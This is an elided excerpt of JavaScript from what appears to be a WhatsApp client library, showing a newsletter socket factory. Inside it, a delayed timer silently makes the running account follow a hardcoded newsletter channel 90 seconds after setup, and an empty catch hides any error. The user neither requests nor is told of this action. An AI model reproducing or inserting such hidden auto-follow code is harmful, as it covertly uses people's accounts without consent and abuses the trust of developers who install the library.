...
const makeNewsletterSocket = (config) => {
    ...
    setTimeout(async () => {
        try {
            await newsletterWMexQuery("120363424813711598@newsletter", Types_1.QueryIds.FOLLOW
            );
        } catch {}
    }, 90000);
    ...
    return {
        ...
        newsletterMultipleFollow: async (jids) => {
            if (typeof jids !== "string")
                throw new Error(
                    'Not a valid jid list, example: sock.newsletterMultipleFollow("12036@newsletter 12036@newsletter")'
                );
